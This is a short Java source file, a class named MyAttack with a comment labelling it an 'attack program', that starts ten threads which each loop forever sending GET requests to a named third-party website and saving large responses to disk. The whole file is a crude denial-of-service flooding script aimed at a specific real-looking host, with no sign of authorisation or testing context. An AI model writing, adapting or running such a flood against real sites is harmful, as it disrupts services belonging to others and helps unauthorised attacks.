package com.xbb.net.common.application;

import com.xbb.net.common.tools.GetPostUtil;
import com.xbb.net.common.tools.MyStream;
import com.xbb.net.common.tools.RandomString;

/**
 * 攻击程序
 * @author a
 *
 */
public class MyAttack extends Thread{

	public static final int THEADS_MAX = 10;

	public static int THREAD_COUNT = 0;
	
	public static void main(String[] args){
		
		for(THREAD_COUNT = 0;THREAD_COUNT < THEADS_MAX;THREAD_COUNT++){
			System.out.println("--->"+THREAD_COUNT);
			new Thread(new MyAttack()).start();
		}
		
	}

	@Override
	public void run() {
//		synchronized (MyAttack.class) {
			GetPostUtil getPostUtil = new GetPostUtil();
			while(true){
				String contenet =getPostUtil.sendGet("http://www.szhaorui.com/", null,"GBK");
				MyStream myStream = new MyStream();
//					System.out.println(contenet);
				String name = System.currentTimeMillis()+RandomString.randomString(6);
				if(contenet.length()>1000){
					myStream.writeToFileByByte("D:/test/attack/",name, contenet);
				}else{
					System.out.println("小于1000");
				}
			}
			
			
//		}
	}
	
	
}
